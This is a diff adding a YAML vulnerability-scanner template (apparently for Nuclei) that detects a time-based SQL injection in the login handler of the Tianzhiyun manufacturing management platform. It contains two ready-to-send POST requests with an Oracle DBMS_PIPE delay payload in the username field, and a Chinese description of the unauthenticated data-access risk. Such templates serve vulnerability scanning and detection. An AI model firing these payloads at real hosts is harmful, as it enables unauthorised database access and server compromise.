@@ -1,0 +1,39 @@
+http:
+    - matchers:
+        - condition: and
+          dsl:
+            - duration_1>=4 && duration_1<=5
+            - duration_2>=8 && duration_2<=9
+          type: dsl
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          POST /Ashx/Usermanager.ashx HTTP/1.1 #这里的GET为请求体1，请求1的延时设置为3
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+          X-Requested-With: XMLHttpRequest
+          Content-Type: application/x-www-form-urlencoded
+
+          type=LOGIN&username=1') AND 8645=DBMS_PIPE.RECEIVE_MESSAGE(CHR(110),4)--&pwd=1&vendor=
+        - |
+          POST /Ashx/Usermanager.ashx HTTP/1.1 #这里的GET为请求体2，请求2的延时设置为6
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+          X-Requested-With: XMLHttpRequest
+          Content-Type: application/x-www-form-urlencoded
+
+          type=LOGIN&username=1') AND 8645=DBMS_PIPE.RECEIVE_MESSAGE(CHR(110),8)--&pwd=1&vendor=
+id: tianzhiyun-Usermanager-sql-injection
+info:
+    author: Superhero
+    description: |-
+        body="Ashx/Usermanager.ashx"
+        天智云智造管理平台 Usermanager.ashx 接囗处存在 SQL注入漏洞，未经授权攻击者可通过该漏洞获取数据库敏感信息，进一步利用可获取服务器权限，导致网站处于极度不安全状态。
+    name: 天智云智造管理平台 Usermanager.ashx SQL延时注入漏洞
+    reference:
+        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247484196&idx=1&sn=dda24010295bcfc008254c266736abe1&chksm=c267b617f5103f013d428a569d4df76a58a772f624e1689c9ee4a74a12875a25ea90d5d3b44e&token=1619136955&lang=zh_CN#rd
+    severity: high
+    tags: []
